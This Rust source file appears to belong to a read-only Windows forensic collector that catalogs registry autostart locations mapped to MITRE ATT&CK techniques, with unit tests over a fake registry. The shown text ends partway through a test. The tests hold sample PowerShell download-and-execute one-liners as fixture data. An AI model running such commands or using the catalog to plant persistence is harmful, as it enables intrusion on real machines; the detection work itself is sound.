//! Extended autostart (ASEP) catalog: registry persistence locations beyond the core
//! Run/services/tasks/Winlogon/IFEO readers in `persist.rs`, chosen from the
//! techniques attackers actually use (MITRE ATT&CK T1546 / T1547 / T1137 / T1037 /
//! T1556) and from the PersistenceSniper detection list.
//!
//! Every location is described once in [`CATALOG`] as data. Reading goes through the
//! [`RegRead`] seam, so the catalog-to-record logic is unit-tested with a fake
//! registry off-Windows; only [`WinReg`] touches the real registry (read-only opens).
//! Judging what is normal for each mechanism is NOT done here — that knowledge lives
//! in `cairn-heur` (analyzers never touch the host; collectors never judge).

use cairn_core::record::{Mechanism, PersistenceRecord, RegValueRecord};
use chrono::{DateTime, Utc};

/// Registry root a catalog entry lives under.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Hive {
    Hklm,
    Hkcu,
    /// HKEY_USERS; keys start with a user SID. Per-user (HKCU) catalog entries are
    /// read here for every loaded user hive, so an elevated run under a helpdesk
    /// account still sees the logged-on victim's Run keys, COM hijacks and RunMRU.
    Hku,
}

impl Hive {
    fn prefix(self) -> &'static str {
        match self {
            Hive::Hklm => "HKLM",
            Hive::Hkcu => "HKCU",
            Hive::Hku => "HKU",
        }
    }
}

/// One registry value's data, reduced to what persistence analysis needs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RegData {
    /// REG_SZ / REG_EXPAND_SZ.
    Str(String),
    /// REG_MULTI_SZ.
    Multi(Vec<String>),
    /// Anything else (DWORD, binary, ...). Not a command; skipped.
    Other,
}

/// A key's values (default value under the name `""`) plus its LastWrite.
pub type KeyValues = (Vec<(String, RegData)>, Option<DateTime<Utc>>);

/// Longest string kept from one registry value, in chars. Real commands are far
/// shorter; fileless malware parks megabyte payloads in values, and every record is
/// cloned into findings and the HTML report. The head (where a launcher and its flags
/// are) is kept.
pub const MAX_REG_STRING_CHARS: usize = 256 * 1024;
/// Most strings kept from one REG_MULTI_SZ value.
pub const MAX_REG_MULTI_ENTRIES: usize = 4096;
/// Most values read from one key.
pub const MAX_REG_VALUES_PER_KEY: usize = 10_000;

/// Registry values cut by a cap during this process (reported by the persist
/// collector in its manifest entry, so a cut is never silent).
pub static REG_VALUES_CAPPED: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

/// `data` within the caps above; true when something was cut. Pure, never panics
/// (cuts on a char boundary).
pub fn cap_reg_data(data: RegData) -> (RegData, bool) {
    fn cap_str(s: String) -> (String, bool) {
        match s.char_indices().nth(MAX_REG_STRING_CHARS) {
            Some((at, _)) => (s[..at].to_string(), true),
            None => (s, false),
        }
    }
    match data {
        RegData::Str(s) => {
            let (s, cut) = cap_str(s);
            (RegData::Str(s), cut)
        }
        RegData::Multi(v) => {
            let mut cut = v.len() > MAX_REG_MULTI_ENTRIES;
            let v = v
                .into_iter()
                .take(MAX_REG_MULTI_ENTRIES)
                .map(|s| {
                    let (s, c) = cap_str(s);
                    cut |= c;
                    s
                })
                .collect();
            (RegData::Multi(v), cut)
        }
        RegData::Other => (RegData::Other, false),
    }
}

/// Read-only registry access used by the catalog. `values` returns every value of a
/// key (default value under the name `""`) plus the key's LastWrite; `subkeys` lists
/// child key names. Both return empty/None when the key is absent or unreadable.
pub trait RegRead {
    fn values(&self, hive: Hive, key: &str) -> Option<KeyValues>;
    fn subkeys(&self, hive: Hive, key: &str) -> Vec<String>;
}

/// SIDs of the interactive user hives loaded under HKEY_USERS (`S-1-5-21-...`,
/// excluding the `_Classes` companions). Service and system profiles are skipped.
pub fn loaded_user_sids(reg: &dyn RegRead) -> Vec<String> {
    let mut sids: Vec<String> = reg
        .subkeys(Hive::Hku, "")
        .into_iter()
        .filter(|k| {
            k.to_ascii_uppercase().starts_with("S-1-5-21-")
                && !k.to_ascii_lowercase().ends_with("_classes")
        })
        .collect();
    sids.sort();
    sids
}

/// Where to read a per-user key: each loaded user hive under HKU, or HKCU when no
/// user hive is visible (non-Windows tests, or HKU unreadable).
fn user_roots(reg: &dyn RegRead, key: &str) -> Vec<(Hive, String)> {
    let sids = loaded_user_sids(reg);
    if sids.is_empty() {
        return vec![(Hive::Hkcu, key.to_string())];
    }
    sids.into_iter()
        .map(|sid| (Hive::Hku, format!("{sid}\\{key}")))
        .collect()
}

/// What to take from a catalog key.
#[derive(Debug, Clone, Copy)]
pub enum Select {
    /// Every value of the key; value name -> `value`, data -> `command`.
    AllValues,
    /// One named value. REG_MULTI_SZ yields one record per item; a list value
    /// (`split_list`) yields one record per comma/space-separated item.
    Value {
        name: &'static str,
        split_list: bool,
    },
    /// For each subkey, the named value (subkey name -> `value`).
    SubkeyValue(&'static str),
    /// For each subkey, the default value of its child key (e.g. CLSID\{x}\InprocServer32).
    SubkeyChildDefault(&'static str),
}

/// How a record's `command` maps to a file for signature checks.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Target {
    /// A command line: binary_path is derived by persist.rs's candidate model.
    Command,
    /// A DLL / package name: a bare name resolves to `%SystemRoot%\System32\<name>`
    /// (`.dll` appended when there is no extension), as the loader would.
    Dll,
}

/// One autostart location.
#[derive(Debug, Clone, Copy)]
pub struct AsepSpec {
    /// `PersistenceRecord.mechanism`; cairn-heur keys its judgement and MITRE ID on it.
    pub mechanism: Mechanism,
    pub hive: Hive,
    pub key: &'static str,
    pub select: Select,
    pub target: Target,
}

const fn spec(
    mechanism: Mechanism,
    hive: Hive,
    key: &'static str,
    select: Select,
    target: Target,
) -> AsepSpec {
    AsepSpec {
        mechanism,
        hive,
        key,
        select,
        target,
    }
}

const LSA: &str = r"SYSTEM\CurrentControlSet\Control\Lsa";
const WINLOGON: &str = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

/// The extended ASEP catalog. Mechanism names are the contract with
/// `cairn_heur::persist` (see `asep_mitre` / `asep_signal` there).
pub const CATALOG: &[AsepSpec] = &[
    // T1547.001 — per-user Run keys, read from every loaded user hive (see Hive::Hku).
    spec(
        Mechanism::RunKey,
        Hive::Hkcu,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        Select::AllValues,
        Target::Command,
    ),
    spec(
        Mechanism::RunKey,
        Hive::Hkcu,
        r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
        Select::AllValues,
        Target::Command,
    ),
    // T1547.001 — 32-bit Run keys and policy-driven Run keys (missed by run_key reader).
    spec(
        Mechanism::RunKey,
        Hive::Hklm,
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
        Select::AllValues,
        Target::Command,
    ),
    spec(
        Mechanism::RunKey,
        Hive::Hklm,
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
        Select::AllValues,
        Target::Command,
    ),
    spec(
        Mechanism::ExplorerPolicyRun,
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        Select::AllValues,
        Target::Command,
    ),
    spec(
        Mechanism::ExplorerPolicyRun,
        Hive::Hkcu,
        r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        Select::AllValues,
        Target::Command,
    ),
    // T1547.001 — BootExecute (native programs run by smss before Windows starts).
    spec(
        Mechanism::BootExecute,
        Hive::Hklm,
        r"SYSTEM\CurrentControlSet\Control\Session Manager",
        Select::Value {
            name: "BootExecute",
            split_list: false,
        },
        Target::Command,
    ),
    // T1547.002 / T1547.005 / T1556.002 — LSA packages and password filters.
    spec(
        Mechanism::LsaAuthPackage,
        Hive::Hklm,
        LSA,
        Select::Value {
            name: "Authentication Packages",
            split_list: false,
        },
        Target::Dll,
    ),
    spec(
        Mechanism::LsaSecurityPackage,
        Hive::Hklm,
        LSA,
        Select::Value {
            name: "Security Packages",
            split_list: false,
        },
        Target::Dll,
    ),
    spec(
        Mechanism::LsaSecurityPackage,
        Hive::Hklm,
        r"SYSTEM\CurrentControlSet\Control\Lsa\OSConfig",
        Select::Value {
            name: "Security Packages",
            split_list: false,
        },
        Target::Dll,
    ),
    spec(
        Mechanism::LsaNotificationPackage,
        Hive::Hklm,
        LSA,
        Select::Value {
            name: "Notification Packages",
            split_list: false,
        },
        Target::Dll,
    ),
    // T1547.003 — time provider DLLs.
    spec(
        Mechanism::TimeProvider,
        Hive::Hklm,
        r"SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders",
        Select::SubkeyValue("DllName"),
        Target::Dll,
    ),
    // T1547.004 — Winlogon Notify packages and MPNotify.
    spec(
        Mechanism::WinlogonNotify,
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify",
        Select::SubkeyValue("DllName"),
        Target::Dll,
    ),
    spec(
        Mechanism::WinlogonMpnotify,
        Hive::Hklm,
        WINLOGON,
        Select::Value {
            name: "mpnotify",
            split_list: false,
        },
        Target::Command,
    ),
    // T1547.010 — port monitors.
    spec(
        Mechanism::PrintMonitor,
        Hive::Hklm,
        r"SYSTEM\CurrentControlSet\Control\Print\Monitors",
        Select::SubkeyValue("Driver"),
        Target::Dll,
    ),
    // T1547.014 — Active Setup.
    spec(
        Mechanism::ActiveSetup,
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Active Setup\Installed Components",
        Select::SubkeyValue("StubPath"),
        Target::Command,
    ),
    // T1546.002 — screensaver.
    spec(
        Mechanism::Screensaver,
        Hive::Hkcu,
        r"Control Panel\Desktop",
        Select::Value {
            name: "SCRNSAVE.EXE",
            split_list: false,
        },
        Target::Command,
    ),
    // T1546.007 — netsh helper DLLs.
    spec(
        Mechanism::NetshHelper,
        Hive::Hklm,
        r"SOFTWARE\Microsoft\NetSh",
        Select::AllValues,
        Target::Dll,
    ),
    // T1546.009 — AppCert DLLs.
    spec(
        Mechanism::AppcertDlls,
        Hive::Hklm,
        r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls",
        Select::AllValues,
        Target::Dll,
    ),
    // T1546.010 — AppInit DLLs (both bitnesses).
    spec(
        Mechanism::AppinitDlls,
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
        Select::Value {
            name: "AppInit_DLLs",
            split_list: true,
        },
        Target::Dll,
    ),
    spec(
        Mechanism::AppinitDlls,
        Hive::Hklm,
        r"SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows",
        Select::Value {
            name: "AppInit_DLLs",
            split_list: true,
        },
        Target::Dll,
    ),
    // T1546.012 — SilentProcessExit monitor (IFEO-adjacent).
    spec(
        Mechanism::SilentExitMonitor,
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit",
        Select::SubkeyValue("MonitorProcess"),
        Target::Command,
    ),
    // T1546.015 — per-user COM hijack (HKCU CLSID shadows HKLM).
    spec(
        Mechanism::ComHijack,
        Hive::Hkcu,
        r"Software\Classes\CLSID",
        Select::SubkeyChildDefault("InprocServer32"),
        Target::Dll,
    ),
    // T1546 — cmd.exe AutoRun.
    spec(
        Mechanism::CmdAutorun,
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Command Processor",
        Select::Value {
            name: "AutoRun",
            split_list: false,
        },
        Target::Command,
    ),
    spec(
        Mechanism::CmdAutorun,
        Hive::Hkcu,
        r"Software\Microsoft\Command Processor",
        Select::Value {
            name: "AutoRun",
            split_list: false,
        },
        Target::Command,
    ),
    // T1137.002 — Office Test key.
    spec(
        Mechanism::OfficeTest,
        Hive::Hkcu,
        r"Software\Microsoft\Office test\Special\Perf",
        Select::Value {
            name: "",
            split_list: false,
        },
        Target::Dll,
    ),
    spec(
        Mechanism::OfficeTest,
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Office test\Special\Perf",
        Select::Value {
            name: "",
            split_list: false,
        },
        Target::Dll,
    ),
    // T1037.001 — logon script.
    spec(
        Mechanism::LogonScript,
        Hive::Hkcu,
        r"Environment",
        Select::Value {
            name: "UserInitMprLogonScript",
            split_list: false,
        },
        Target::Command,
    ),
];

/// Turn one catalog entry into raw records via `reg`. Pure given `reg`; never panics.
/// `binary_path` is filled only for [`Target::Dll`] (via `system_root`); command-line
/// targets are resolved later by persist.rs's candidate model.
pub fn read_spec(reg: &dyn RegRead, spec: &AsepSpec, system_root: &str) -> Vec<PersistenceRecord> {
    let roots = match spec.hive {
        Hive::Hkcu => user_roots(reg, spec.key),
        h => vec![(h, spec.key.to_string())],
    };
    roots
        .into_iter()
        .flat_map(|(hive, key)| read_spec_at(reg, spec, hive, &key, system_root))
        .collect()
}

/// [`read_spec`] for one concrete (hive, key) root.
fn read_spec_at(
    reg: &dyn RegRead,
    spec: &AsepSpec,
    hive: Hive,
    spec_key: &str,
    system_root: &str,
) -> Vec<PersistenceRecord> {
    let base = format!("{}\\{}", hive.prefix(), spec_key);
    let mut out = Vec::new();
    let mut push = |location: String, value: String, data: String, lw: Option<DateTime<Utc>>| {
        let data = data.trim().trim_end_matches('\0').trim().to_string();
        if data.is_empty() {
            return;
        }
        let binary_path = match spec.target {
            Target::Dll => Some(resolve_dll(&data, system_root)),
            Target::Command => None,
        };
        out.push(PersistenceRecord {
            mechanism: spec.mechanism,
            location,
            value: Some(value),
            command: Some(data),
            binary_path,
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write: lw,
            bound: None,
            signer_source: None,
            service_start: None,
        });
    };
    match spec.select {
        Select::AllValues => {
            if let Some((values, lw)) = reg.values(hive, spec_key) {
                for (name, data) in values {
                    for item in items(&data, false) {
                        push(base.clone(), name.clone(), item, lw);
                    }
                }
            }
        }
        Select::Value { name, split_list } => {
            if let Some((values, lw)) = reg.values(hive, spec_key) {
                for (n, data) in values {
                    if !n.eq_ignore_ascii_case(name) {
                        continue;
                    }
                    for item in items(&data, split_list) {
                        let label = if name.is_empty() { "(Default)" } else { name };
                        push(base.clone(), label.to_string(), item, lw);
                    }
                }
            }
        }
        Select::SubkeyValue(value_name) => {
            for sub in reg.subkeys(hive, spec_key) {
                let key = format!("{}\\{}", spec_key, sub);
                if let Some((values, lw)) = reg.values(hive, &key) {
                    for (n, data) in values {
                        if n.eq_ignore_ascii_case(value_name) {
                            for item in items(&data, false) {
                                push(format!("{base}\\{sub}"), sub.clone(), item, lw);
                            }
                        }
                    }
                }
            }
        }
        Select::SubkeyChildDefault(child) => {
            for sub in reg.subkeys(hive, spec_key) {
                let key = format!("{}\\{}\\{}", spec_key, sub, child);
                if let Some((values, lw)) = reg.values(hive, &key) {
                    for (n, data) in values {
                        if n.is_empty() {
                            for item in items(&data, false) {
                                push(format!("{base}\\{sub}\\{child}"), sub.clone(), item, lw);
                            }
                        }
                    }
                }
            }
        }
    }
    out
}

/// Read the whole catalog. Every entry is best-effort: an absent key contributes
/// nothing.
pub fn read_catalog(reg: &dyn RegRead, system_root: &str) -> Vec<PersistenceRecord> {
    CATALOG
        .iter()
        .flat_map(|s| read_spec(reg, s, system_root))
        .collect()
}

/// Split a value's data into the items it lists.
fn items(data: &RegData, split_list: bool) -> Vec<String> {
    match data {
        RegData::Str(s) if split_list => s
            .split([',', ' '])
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string)
            .collect(),
        RegData::Str(s) => vec![s.clone()],
        RegData::Multi(v) => v.iter().filter(|s| !s.trim().is_empty()).cloned().collect(),
        RegData::Other => Vec::new(),
    }
}

/// Resolve a DLL/package reference the way the loader would for these keys: absolute
/// paths stay (env vars expanded), bare names live in `%SystemRoot%\System32`, and a
/// missing extension means `.dll`. Quotes are stripped.
pub fn resolve_dll(name: &str, system_root: &str) -> String {
    let n = name.trim().trim_matches('"');
    let expanded = expand_system_root(n, system_root);
    let is_path = expanded.contains('\\') || expanded.contains('/');
    let with_dir = if is_path {
        expanded
    } else {
        format!(r"{system_root}\System32\{expanded}")
    };
    let file = with_dir.rsplit(['\\', '/']).next().unwrap_or("");
    if file.contains('.') {
        with_dir
    } else {
        format!("{with_dir}.dll")
    }
}

/// Expand `%SystemRoot%` / `%windir%` (any case) — the only variables these keys use.
fn expand_system_root(s: &str, system_root: &str) -> String {
    let lower = s.to_ascii_lowercase();
    for var in ["%systemroot%", "%windir%"] {
        if let Some(pos) = lower.find(var) {
            return format!("{}{}{}", &s[..pos], system_root, &s[pos + var.len()..]);
        }
    }
    s.to_string()
}

/// Explorer's Run dialog (Win+R) history. ClickFix / "paste-and-run" lures (T1204.004)
/// make the user paste a command here, so its entries are direct evidence of what was
/// run. Not persistence: these records go out as `RegValue`, not `Persistence`.
pub const RUN_MRU_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";

/// One `RegValueRecord` per Run-dialog entry of every loaded user, most recent first
/// (`MRUList` order). The trailing `\1` Explorer appends to each command is removed.
/// `last_write` is the key's LastWrite, which dates only the most recent entry:
/// `mru_rank` (0 = most recent, the `MRUList` position) says which one that is. An
/// entry missing from `MRUList` sorts last with `mru_rank: None`.
pub fn read_run_mru(reg: &dyn RegRead) -> Vec<RegValueRecord> {
    let mut out = Vec::new();
    for (hive, key) in user_roots(reg, RUN_MRU_KEY) {
        let Some((values, lw)) = reg.values(hive, &key) else {
            continue;
        };
        let order: String = values
            .iter()
            .find(|(n, _)| n.eq_ignore_ascii_case("MRUList"))
            .and_then(|(_, d)| match d {
                RegData::Str(s) => Some(s.clone()),
                _ => None,
            })
            .unwrap_or_default();
        let mut entries: Vec<(usize, String, String)> = values
            .iter()
            .filter(|(n, _)| !n.eq_ignore_ascii_case("MRUList"))
            .filter_map(|(n, d)| match d {
                RegData::Str(s) => {
                    let cmd = s.strip_suffix("\\1").unwrap_or(s).trim().to_string();
                    let rank = n
                        .chars()
                        .next()
                        .and_then(|c| order.find(c))
                        .unwrap_or(usize::MAX);
                    (!cmd.is_empty()).then(|| (rank, n.clone(), cmd))
                }
                _ => None,
            })
            .collect();
        entries.sort();
        let (hive_label, key_path) = record_hive_and_key(hive, &key);
        for (rank, name, cmd) in entries {
            out.push(RegValueRecord {
                hive: hive_label.clone(),
                key: key_path.clone(),
                value: name,
                data: cmd,
                last_write: lw,
                // MRUList holds one ASCII letter per entry, so the byte index of the
                // value's letter is its rank; usize::MAX marks "not in MRUList".
                mru_rank: (rank != usize::MAX)
                    .then(|| u32::try_from(rank).ok())
                    .flatten(),
            });
        }
    }
    out
}

/// Split a per-user (hive, key) root into the RegValueRecord's `hive` label
/// (`HKU\<sid>` or `HKCU`) and the key path below it.
fn record_hive_and_key(hive: Hive, key: &str) -> (String, String) {
    match key.split_once('\\') {
        Some((sid, rest)) if hive == Hive::Hku => (format!("HKU\\{sid}"), rest.to_string()),
        _ => (hive.prefix().to_string(), key.to_string()),
    }
}

/// Explorer address-bar history, RunMRU's sibling: paths and commands typed into the
/// File Explorer address bar (which also launches programs, so paste-and-run lures
/// use it too). Not persistence: emitted as `RegValue`.
pub const TYPED_PATHS_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths";

/// One `RegValueRecord` per TypedPaths entry of every loaded user (same per-user roots
/// as [`read_run_mru`]). Values are named `url1` (most recent) .. `urlN`; records are
/// emitted in that order with `mru_rank = N - 1`. Other value names are ignored.
/// `last_write` is the key's LastWrite (dates only `mru_rank == 0`).
pub fn read_typed_paths(reg: &dyn RegRead) -> Vec<RegValueRecord> {
    let mut out = Vec::new();
    for (hive, key) in user_roots(reg, TYPED_PATHS_KEY) {
        let Some((values, lw)) = reg.values(hive, &key) else {
            continue;
        };
        let mut entries: Vec<(u32, String, String)> = values
            .iter()
            .filter_map(|(n, d)| {
                let idx: u32 = n
                    .get(..3)
                    .filter(|p| p.eq_ignore_ascii_case("url"))
                    .and_then(|_| n.get(3..))
                    .and_then(|digits| digits.parse().ok())
                    .filter(|&i| i >= 1)?;
                match d {
                    RegData::Str(s) if !s.trim().is_empty() => {
                        Some((idx, n.clone(), s.trim().to_string()))
                    }
                    _ => None,
                }
            })
            .collect();
        entries.sort();
        let (hive_label, key_path) = record_hive_and_key(hive, &key);
        for (idx, name, path) in entries {
            out.push(RegValueRecord {
                hive: hive_label.clone(),
                key: key_path.clone(),
                value: name,
                data: path,
                last_write: lw,
                mru_rank: Some(idx - 1),
            });
        }
    }
    out
}

/// Max bytes of a PowerShell profile kept in `command` for content inspection.
const PROFILE_EXCERPT_BYTES: usize = 8 * 1024;

/// The PowerShell profile scripts that run at every PowerShell start (T1546.013):
/// all-users profiles for Windows PowerShell and PowerShell 7, and the per-user
/// profiles under Documents of the current user and of every profile dir in `homes`.
/// Missing env vars just drop their entries; duplicates are removed.
pub fn ps_profile_paths(env: impl Fn(&str) -> Option<String>, homes: &[String]) -> Vec<String> {
    let mut out = Vec::new();
    if let Some(root) = env("SystemRoot").or_else(|| env("windir")) {
        for f in ["profile.ps1", "Microsoft.PowerShell_profile.ps1"] {
            out.push(format!(r"{root}\System32\WindowsPowerShell\v1.0\{f}"));
        }
    }
    if let Some(pf) = env("ProgramFiles") {
        for f in ["profile.ps1", "Microsoft.PowerShell_profile.ps1"] {
            out.push(format!(r"{pf}\PowerShell\7\{f}"));
        }
    }
    let mut all_homes: Vec<String> = env("USERPROFILE").into_iter().collect();
    all_homes.extend(homes.iter().cloned());
    for home in all_homes {
        for dir in ["WindowsPowerShell", "PowerShell"] {
            for f in ["profile.ps1", "Microsoft.PowerShell_profile.ps1"] {
                let p = format!(r"{home}\Documents\{dir}\{f}");
                if !out.iter().any(|o: &String| o.eq_ignore_ascii_case(&p)) {
                    out.push(p);
                }
            }
        }
    }
    out
}

/// One `ps_profile` record per existing profile file. `command` holds the first
/// [`PROFILE_EXCERPT_BYTES`] of its text so cairn-heur can look for download/encoded
/// payloads; `binary_path` is the script itself. Read-only; unreadable files skipped.
pub fn read_ps_profiles(paths: &[String]) -> Vec<PersistenceRecord> {
    let mut out = Vec::new();
    for path in paths {
        // Only the excerpt is read: a planted multi-GB profile must not be loaded whole.
        // Decoded by BOM (ISE and Windows PowerShell 5 often save UTF-16LE).
        let Some(bytes) =
            crate::read_head_capped(std::path::Path::new(path), PROFILE_EXCERPT_BYTES as u64)
        else {
            continue;
        };
        let text = crate::decode_text(&bytes)
            .trim_start_matches('\u{feff}')
            .to_string();
        let last_write = std::fs::metadata(path)
            .ok()
            .and_then(|m| m.modified().ok())
            .map(DateTime::<Utc>::from);
        let file = path.rsplit(['\\', '/']).next().unwrap_or(path).to_string();
        out.push(PersistenceRecord {
            mechanism: Mechanism::PsProfile,
            location: path.clone(),
            value: Some(file),
            command: Some(text),
            binary_path: Some(path.clone()),
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write,
            bound: None,
            signer_source: None,
            service_start: None,
        });
    }
    out
}

/// The real, read-only Windows registry.
#[cfg(windows)]
pub struct WinReg;

#[cfg(windows)]
fn predef(hive: Hive) -> winreg::RegKey {
    use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS};
    winreg::RegKey::predef(match hive {
        Hive::Hklm => HKEY_LOCAL_MACHINE,
        Hive::Hkcu => HKEY_CURRENT_USER,
        Hive::Hku => HKEY_USERS,
    })
}

#[cfg(windows)]
impl RegRead for WinReg {
    fn values(&self, hive: Hive, key: &str) -> Option<KeyValues> {
        use chrono::TimeZone;
        use winreg::enums::RegType;
        let root = predef(hive);
        let k = root.open_subkey(key).ok()?;
        let lw = k.query_info().ok().and_then(|info| {
            let st = info.get_last_write_time_system();
            Utc.with_ymd_and_hms(
                st.wYear as i32,
                st.wMonth as u32,
                st.wDay as u32,
                st.wHour as u32,
                st.wMinute as u32,
                st.wSecond as u32,
            )
            .single()
        });
        let mut out = Vec::new();
        let mut capped = 0u64;
        for (i, item) in k.enum_values().flatten().enumerate() {
            if i >= MAX_REG_VALUES_PER_KEY {
                capped += 1;
                break;
            }
            let (name, raw) = item;
            let data = match raw.vtype {
                RegType::REG_SZ | RegType::REG_EXPAND_SZ => k
                    .get_value::<String, _>(&name)
                    .map(RegData::Str)
                    .unwrap_or(RegData::Other),
                RegType::REG_MULTI_SZ => k
                    .get_value::<Vec<String>, _>(&name)
                    .map(RegData::Multi)
                    .unwrap_or(RegData::Other),
                _ => RegData::Other,
            };
            let (data, cut) = cap_reg_data(data);
            capped += u64::from(cut);
            out.push((name, data));
        }
        if capped > 0 {
            REG_VALUES_CAPPED.fetch_add(capped, std::sync::atomic::Ordering::Relaxed);
        }
        Some((out, lw))
    }

    fn subkeys(&self, hive: Hive, key: &str) -> Vec<String> {
        predef(hive)
            .open_subkey(key)
            .map(|k| k.enum_keys().flatten().collect())
            .unwrap_or_default()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    /// Oversized strings are cut on a char boundary and multi-strings are capped; small
    /// values pass through untouched.
    #[test]
    fn cap_reg_data_bounds_huge_values() {
        let small = RegData::Str("cmd.exe /c x".into());
        assert_eq!(cap_reg_data(small.clone()), (small, false));
        let huge = "文".repeat(MAX_REG_STRING_CHARS + 10);
        let (RegData::Str(s), true) = cap_reg_data(RegData::Str(huge)) else {
            panic!("huge string must be cut");
        };
        assert_eq!(s.chars().count(), MAX_REG_STRING_CHARS);
        let many = vec!["a".to_string(); MAX_REG_MULTI_ENTRIES + 1];
        let (RegData::Multi(v), true) = cap_reg_data(RegData::Multi(many)) else {
            panic!("multi must be capped");
        };
        assert_eq!(v.len(), MAX_REG_MULTI_ENTRIES);
        assert_eq!(cap_reg_data(RegData::Other), (RegData::Other, false));
    }

    /// In-memory registry: (hive, lowercased key) -> values; subkeys derived from keys.
    #[derive(Default)]
    struct FakeReg {
        keys: HashMap<(u8, String), Vec<(String, RegData)>>,
    }

    fn hive_id(h: Hive) -> u8 {
        match h {
            Hive::Hklm => 0,
            Hive::Hkcu => 1,
            Hive::Hku => 2,
        }
    }

    impl FakeReg {
        fn set(&mut self, hive: Hive, key: &str, name: &str, data: RegData) -> &mut Self {
            self.keys
                .entry((hive_id(hive), key.to_ascii_lowercase()))
                .or_default()
                .push((name.to_string(), data));
            self
        }
    }

    impl RegRead for FakeReg {
        fn values(&self, hive: Hive, key: &str) -> Option<KeyValues> {
            self.keys
                .get(&(hive_id(hive), key.to_ascii_lowercase()))
                .map(|v| (v.clone(), None))
        }
        fn subkeys(&self, hive: Hive, key: &str) -> Vec<String> {
            let prefix = if key.is_empty() {
                String::new()
            } else {
                format!("{}\\", key.to_ascii_lowercase())
            };
            let mut subs: Vec<String> = self
                .keys
                .keys()
                .filter(|(h, k)| *h == hive_id(hive) && k.starts_with(&prefix))
                .filter_map(|(_, k)| k[prefix.len()..].split('\\').next().map(str::to_string))
                .collect();
            subs.sort();
            subs.dedup();
            subs
        }
    }

    fn s(v: &str) -> RegData {
        RegData::Str(v.to_string())
    }

    const SID: &str = "S-1-5-21-1111-2222-3333-1001";

    /// With user hives loaded under HKU, per-user entries are read from each of them
    /// (not from HKCU), and the `_Classes` companion hive is not mistaken for a user.
    #[test]
    fn per_user_entries_are_read_from_every_loaded_user_hive() {
        let mut reg = FakeReg::default();
        let other = "S-1-5-21-1111-2222-3333-1002";
        for sid in [SID, other] {
            reg.set(
                Hive::Hku,
                &format!(r"{sid}\Environment"),
                "UserInitMprLogonScript",
                s(&format!(r"C:\Users\{sid}\x.bat")),
            );
        }
        reg.set(Hive::Hku, &format!(r"{SID}_Classes\CLSID"), "", s("x"));
        reg.set(
            Hive::Hku,
            r"S-1-5-18\Environment",
            "UserInitMprLogonScript",
            s("svc"),
        );
        reg.set(
            Hive::Hkcu,
            r"Environment",
            "UserInitMprLogonScript",
            s("hkcu"),
        );
        let recs: Vec<_> = read_catalog(&reg, r"C:\Windows")
            .into_iter()
            .filter(|r| r.mechanism == Mechanism::LogonScript)
            .collect();
        assert_eq!(recs.len(), 2, "{recs:?}");
        assert!(recs[0]
            .location
            .starts_with(r"HKU\s-1-5-21-1111-2222-3333-1001\"));
        assert!(recs.iter().all(|r| r.command.as_deref() != Some("hkcu")));
    }

    #[test]
    fn run_mru_is_ordered_most_recent_first_and_strips_suffix() {
        let mut reg = FakeReg::default();
        let key = format!(r"{SID}\{RUN_MRU_KEY}");
        reg.set(Hive::Hku, &key, "a", s(r"notepad\1"));
        reg.set(
            Hive::Hku,
            &key,
            "b",
            s(r"powershell -w h -c iwr http://x/y | iex\1"),
        );
        reg.set(Hive::Hku, &key, "MRUList", s("ba"));
        let recs = read_run_mru(&reg);
        assert_eq!(recs.len(), 2);
        assert_eq!(recs[0].data, "powershell -w h -c iwr http://x/y | iex");
        assert_eq!(recs[1].data, "notepad");
        assert_eq!(recs[0].hive, r"HKU\s-1-5-21-1111-2222-3333-1001");
        assert_eq!(
            recs[0].key.to_ascii_lowercase(),
            RUN_MRU_KEY.to_ascii_lowercase()
        );
        assert_eq!(recs[0].mru_rank, Some(0));
        assert_eq!(recs[1].mru_rank, Some(1));
    }

    /// An entry missing from MRUList sorts last and has no rank.
    #[test]
    fn run_mru_entry_outside_mrulist_has_no_rank() {
        let mut reg = FakeReg::default();
        reg.set(Hive::Hkcu, RUN_MRU_KEY, "c", s(r"calc\1"))
            .set(Hive::Hkcu, RUN_MRU_KEY, "a", s(r"cmd\1"))
            .set(Hive::Hkcu, RUN_MRU_KEY, "MRUList", s("a"));
        let recs = read_run_mru(&reg);
        assert_eq!(recs.len(), 2);
        assert_eq!((recs[0].data.as_str(), recs[0].mru_rank), ("cmd", Some(0)));
        assert_eq!((recs[1].data.as_str(), recs[1].mru_rank), ("calc", None));
    }

    #[test]
    fn typed_paths_ordered_by_url_index_with_rank() {
        let mut reg = FakeReg::default();
        let key = format!(r"{SID}\{TYPED_PATHS_KEY}");
        reg.set(Hive::Hku, &key, "url10", s(r"C:\old"))
            .set(Hive::Hku, &key, "url2", s(r"\\10.0.0.5\share"))
            .set(Hive::Hku, &key, "url1", s("powershell -w h -c iex(irm x)"))
